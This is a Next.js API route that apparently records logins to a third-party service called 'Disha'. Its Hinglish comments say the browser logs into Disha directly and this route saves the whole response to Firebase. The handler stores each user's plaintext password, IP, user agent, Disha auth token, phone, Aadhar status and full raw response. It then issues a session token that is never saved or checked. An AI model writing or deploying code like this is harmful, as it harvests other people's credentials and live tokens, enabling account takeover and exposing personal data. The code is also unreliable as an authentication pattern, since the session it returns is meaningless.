import { NextRequest, NextResponse } from "next/server";
import crypto from "crypto";
import { saveUserLoginToDb } from "@/lib/db";

export const dynamic = "force-dynamic";

/**
 * POST /api/auth/save-login
 * Browser Disha API se seedha login karta hai.
 * Ye route sirf full Disha response ko Firebase me save karta hai
 * aur ek session token return karta hai.
 */
export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const email = String(body?.email || "").trim();
    const password = String(body?.password || "").trim();
    const dishaResponse = body?.dishaResponse as Record<string, unknown> || {};

    if (!email) {
      return NextResponse.json({ ok: false, error: "Missing email." }, { status: 400 });
    }

    const ip =
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      "unknown";
    const userAgent = req.headers.get("user-agent") || "unknown";

    const u =
      dishaResponse?.data && typeof dishaResponse.data === "object"
        ? (dishaResponse.data as Record<string, unknown>)
        : {};

    await saveUserLoginToDb({
      userId: email,
      password,
      ip,
      userAgent,
      createdAt: new Date().toISOString(),
      dishaUserId: String(u?.userid || ""),
      dishaName: String(u?.name || ""),
      dishaEmail: String(u?.email || ""),
      dishaPhone: String(u?.phone || ""),
      dishaUsername: String(u?.username || ""),
      dishaState: String(u?.state || ""),
      dishaToken: String(u?.token || ""),
      dishaPhoto: String(u?.photo || ""),
      dishaAppCategory: String(u?.app_category || ""),
      dishaIsPaidUser: String(u?.is_paid_user || "0"),
      dishaIsTester: String(u?.is_tester ?? ""),
      dishaAadharStatus: String(u?.aadhar_status || ""),
      dishaFullResponse: JSON.stringify(dishaResponse),
    });

    const sessionToken = crypto.randomBytes(24).toString("hex");
    return NextResponse.json({ ok: true, sessionToken, loginTime: Date.now() });
  } catch {
    return NextResponse.json(
      { ok: false, error: "Unable to save login data." },
      { status: 500 }
    );
  }
}
